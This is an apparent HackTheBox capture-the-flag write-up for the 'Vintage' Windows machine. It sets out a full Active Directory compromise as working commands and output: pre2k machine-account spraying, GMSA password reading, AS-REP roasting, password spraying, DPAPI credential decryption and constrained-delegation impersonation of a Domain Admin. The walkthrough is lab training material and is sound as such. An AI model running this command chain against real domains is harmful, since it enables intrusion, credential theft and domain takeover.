---
title: "HTB - Vintage (Hard | Windows | Active Directory)"
date: 2025-08-15
categories: [HackTheBox, Active Directory, pre2k, DPAPI]
tags: [htb, active-directory, kerberos, dpapi, pre2k, gmsa, as-rep-roasting, constrained-delegation, bloodhound, impacket]
image:
  path: https://i.pinimg.com/originals/ff/a9/6e/ffa96ede4039820cdac1185df70b8dc7.gif
---

## Overview

**Vintage** is a Hard-rated HackTheBox Windows machine centered around Active Directory attack chains. Starting with low-privileged credentials, we abuse Pre-Windows 2000 compatibility misconfigurations, read GMSA passwords, perform AS-REP Roasting, extract DPAPI-protected credentials, and finally leverage Kerberos Constrained Delegation to impersonate a Domain Admin.

| Field | Details |
|---|---|
| OS | Windows Server 2022 |
| Difficulty | Hard |
| IP | 10.10.11.45 |
| Domain | vintage.htb |
| Initial Credentials | P.Rosa : Rosaisbest1 |

---

## Reconnaissance

### Nmap

```bash
nmap -p- --open --min-rate 5000 -Pn -n -sC -sV 10.10.11.45
```

```
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows AD LDAP (Domain: vintage.htb)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows AD LDAP
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0
9389/tcp  open  mc-nmf        .NET Message Framing
Service Info: Host: DC01; OS: Windows
```

Classic Domain Controller port profile. Kerberos (88), LDAP (389/3268), WinRM (5985) and SMB (445) are all open — this is a full AD attack surface.

---

## Enumeration

### Kerberos Authentication Setup

Standard NTLM auth was throwing Kerberos errors with crackmapexec, so we grab a TGT for P.Rosa first:

```bash
kinit P.Rosa@VINTAGE.HTB
```

### SMB Enumeration + RID Brute Force

```bash
nxc smb 'dc01.vintage.htb' -k -u 'P.Rosa' -p 'Rosaisbest1' --shares --rid-brute 10000
```

This gives us a full user list. Save all usernames to `users.txt`.

### LDAP Enumeration

Confirming LDAP access and enumerating privileged accounts:

```bash
nxc ldap 'dc01.vintage.htb' -k -u 'P.Rosa' -p 'Rosaisbest1'
nxc ldap 'dc01.vintage.htb' -k -u 'P.Rosa' -p 'Rosaisbest1' --admin-count
```

Result: `L.Bianchi_adm` has `adminCount=1` — this is our target account.

### Full LDAP Dump

```bash
ldapsearch -x -H ldap://dc01.vintage.htb \
  -D "P.Rosa@VINTAGE.HTB" -w "Rosaisbest1" \
  -b "DC=vintage,DC=htb" "(objectClass=*)" > ldap_dump.out

grep "sAMAccountName:" ldap_dump.out | awk '{print $2}' | sort | uniq > users.txt
```

Notable finding: the domain uses **Pre-Windows 2000 compatibility** permissions — object-level ACLs instead of attribute-level, which allows us to read attributes we normally shouldn't have access to.

---

## BloodHound

```bash
bloodhound-python -u 'P.Rosa' -p 'Rosaisbest1' \
  -d 'vintage.htb' -ns 10.10.11.45 --zip -c All -dc 'dc01.vintage.htb'
```

![BloodHound graph 1](/assets/img/posts/vintage/bh1.png)
![BloodHound graph 2](/assets/img/posts/vintage/bh2.png)

Key findings from BloodHound:

- `FS01$` has **ReadGMSAPassword** over `GMSA01$`
- `GMSA01$` has **AddSelf** and **GenericWrite** over `SERVICEMANAGERS`
- No direct path from P.Rosa to high-value targets — we need to pivot through computer accounts

---

## Foothold — Pre2k Attack

### Exploiting Pre-Windows 2000 Computer Accounts

Machine accounts created with Pre-Win2000 compatibility have their password set to the lowercase hostname by default. We use `pre2k` to spray this against all accounts:

```bash
pre2k unauth -d vintage.htb -dc-ip 10.10.11.45 -save -inputfile users.txt
```

```
[INFO] VALID CREDENTIALS: vintage.htb\FS01$:fs01
[INFO] Saving ticket in FS01$.ccache
```

```bash
export KRB5CCNAME=FS01\$.ccache
```

### Reading GMSA Password

Since `FS01$` has `ReadGMSAPassword` over `GMSA01$`, we can extract its NT hash:

```bash
bloodyAD --host dc01.vintage.htb -d VINTAGE.HTB \
  --dc-ip 10.10.11.45 -k \
  get object 'GMSA01$' --attr msDS-ManagedPassword
```

```
msDS-ManagedPassword.NTLM: aad3b435b51404eeaad3b435b51404ee:b3a15bbdfb1c53238d4b50ea2c4d1178
```

### Getting GMSA01$ TGT

```bash
getTGT.py vintage.htb/'GMSA01$' -hashes :b3a15bbdfb1c53238d4b50ea2c4d1178
export KRB5CCNAME=GMSA01\$.ccache
```

![BloodHound GMSA01 path](/assets/img/posts/vintage/bh3.png)

### Abusing GenericWrite — Adding to SERVICEMANAGERS

```bash
bloodyAD --host dc01.vintage.htb -d VINTAGE.HTB \
  --dc-ip 10.10.11.45 -k \
  add groupMember "SERVICEMANAGERS" "GMSA01$"
```

---

## AS-REP Roasting via GenericWrite

With `GenericWrite` over service accounts in `SERVICEMANAGERS`, we can disable Kerberos pre-authentication and roast them.

![BloodHound GenericWrite path](/assets/img/posts/vintage/bh4.png)
![BloodHound SERVICEMANAGERS members](/assets/img/posts/vintage/bh5.png)

### Disable Pre-Auth

```bash
bloodyAD --host dc01.vintage.htb -d VINTAGE.HTB \
  --dc-ip 10.10.11.45 -k \
  add uac <service_user> -f DONT_REQ_PREAUTH
```

![bloodyAD disable preauth](/assets/img/posts/vintage/bloody1.png)

> Note: This works on service accounts but not regular user accounts (insufficient permissions).

### Re-enable Disabled Accounts

```bash
bloodyAD --host dc01.vintage.htb -d VINTAGE.HTB \
  --dc-ip 10.10.11.45 -k \
  remove uac <service_user> -f ACCOUNTDISABLE
```

![bloodyAD re-enable accounts](/assets/img/posts/vintage/bloody2.png)

### AS-REP Roast

```bash
GetNPUsers.py vintage.htb/ -request -usersfile users.txt -format hashcat
```

![GetNPUsers output](/assets/img/posts/vintage/getnpusers1.png)

### Crack with Hashcat

```bash
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt --force
```

Result: `SVC_SQL` cracked → `Zer0the0ne`

### Password Spray

```bash
./kerbrute_linux_amd64 passwordspray -d vintage.htb --dc 10.10.11.45 users.txt Zer0the0ne
```

```
[+] VALID LOGIN: C.Neri@vintage.htb:Zer0the0ne
```

### WinRM as C.Neri

```bash
getTGT.py vintage.htb/'C.Neri':'Zer0the0ne'
export KRB5CCNAME=C.Neri.ccache
evil-winrm -i dc01.vintage.htb -r vintage.htb
```

```powershell
C:\Users\C.Neri\Desktop> type user.txt
```

**User flag captured.**

---

## Privilege Escalation

### DPAPI Credential Extraction

Inspecting `AppData` reveals DPAPI vault artifacts:

```powershell
Get-ChildItem "C:\Users\C.Neri\AppData\Roaming\Microsoft\Credentials" -Force | Format-List
Get-ChildItem "C:\Users\C.Neri\AppData\Roaming\Microsoft\Protect" -Force | Format-List
```

![DPAPI AppData result](/assets/img/posts/vintage/dpapi-result.png)

Two master keys found. Download all files with evil-winrm's `download` command.

### Decrypt Master Keys

```bash
dpapi.py masterkey \
  -file "4dbf04d8-529b-4b4c-b4ae-8e875e4fe847" \
  -sid S-1-5-21-4024337825-2033394866-2055507597-1115 \
  -password Zer0the0ne
# Decrypted key: 0x55d51b40d9aa...

dpapi.py masterkey \
  -file "99cf41a3-a552-4cf7-a8d7-aca2d6f7339b" \
  -sid S-1-5-21-4024337825-2033394866-2055507597-1115 \
  -password Zer0the0ne
# Decrypted key: 0xf8901b2125dd...
```

### Decrypt Credential Blob

```bash
dpapi.py credential \
  -file "C4BB96844A5C9DD45D5B6A9859252BA6" \
  -key <decrypted_master_key_hex>
```

![DPAPI credential dump](/assets/img/posts/vintage/dpapi-dump.png)

Credentials recovered: `C.Neri_adm : Uncr4ck4bl3P4ssW0rd0312`

---

## Domain Admin via Constrained Delegation

### Re-enumerate with C.Neri_adm

```bash
bloodhound-python -u 'C.Neri_adm' -p 'Uncr4ck4bl3P4ssW0rd0312' \
  -d 'vintage.htb' -ns 10.10.11.45 --zip -c All -dc 'dc01.vintage.htb'
```

![BloodHound C.Neri_adm graph](/assets/img/posts/vintage/bh6.png)
![BloodHound DelegatedAdmins path](/assets/img/posts/vintage/bh7.png)

```bash
getTGT.py vintage.htb/'c.neri_adm':'Uncr4ck4bl3P4ssW0rd0312'
export KRB5CCNAME=c.neri_adm.ccache
```

BloodHound reveals: `C.Neri_adm` can add members to `DELEGATEDADMINS`, and accounts in that group have constrained delegation.

### Add SVC_SQL to DelegatedAdmins

```bash
bloodyAD --host dc01.vintage.htb --dc-ip 10.10.11.45 \
  -d "VINTAGE.HTB" -u c.neri_adm -p 'Uncr4ck4bl3P4ssW0rd0312' -k \
  add groupMember "DELEGATEDADMINS" "SVC_SQL"
```

### Re-enable SVC_SQL + Assign SPN

```bash
bloodyAD --host dc01.vintage.htb -d VINTAGE.HTB \
  --dc-ip 10.10.11.45 -k \
  remove uac svc_sql -f ACCOUNTDISABLE

bloodyAD --host dc01.vintage.htb -d VINTAGE.HTB \
  --dc-ip 10.10.11.45 -k \
  set object svc_sql servicePrincipalName -v "cifs/dc02.htb"
```

### Get SVC_SQL TGT

```bash
getTGT.py vintage.htb/svc_sql:Zer0the0ne -dc-ip dc01.vintage.htb
export KRB5CCNAME=svc_sql.ccache
```

### Constrained Delegation — Impersonate L.Bianchi_adm

Since `SVC_SQL` now has constrained delegation rights for `cifs/dc01.vintage.htb`, we can request a service ticket impersonating a Domain Admin:

```bash
impacket-getST \
  -spn 'cifs/dc01.vintage.htb' \
  -impersonate L.BIANCHI_ADM \
  -dc-ip 10.10.11.45 -k \
  'vintage.htb/svc_sql:Zer0the0ne'

export KRB5CCNAME='L.BIANCHI_ADM@cifs_dc01.vintage.htb@VINTAGE.HTB.ccache'
```

### Shell as Domain Admin

```bash
wmiexec.py -k -no-pass VINTAGE.HTB/L.BIANCHI_ADM@dc01.vintage.htb
```

```powershell
C:\Users\Administrator\Desktop> type root.txt
```

**Root flag captured.**

---

## Attack Chain Summary

```
P.Rosa (initial creds)
  └─► Pre2k spray → FS01$ compromised
        └─► ReadGMSAPassword → GMSA01$ NT hash
              └─► GenericWrite → SERVICEMANAGERS membership
                    └─► AS-REP Roasting → SVC_SQL:Zer0the0ne
                          └─► Password spray → C.Neri:Zer0the0ne
                                └─► WinRM → User Flag
                                      └─► DPAPI decrypt → C.Neri_adm:Uncr4ck4bl3P4ssW0rd0312
                                            └─► Constrained Delegation → L.BIANCHI_ADM
                                                  └─► Domain Admin → Root Flag
```

---

## Key Takeaways

- **Pre-Windows 2000 compatibility** is a commonly overlooked misconfiguration that gives attackers a foothold via predictable machine account passwords.
- **GMSA accounts** with `ReadGMSAPassword` delegated to compromised principals are a direct path to lateral movement.
- **DPAPI** credentials stored in `AppData` often contain admin-level passwords — always check after gaining a foothold.
- **Constrained Delegation** allows full impersonation of privileged accounts when combined with group membership control via `GenericWrite`.
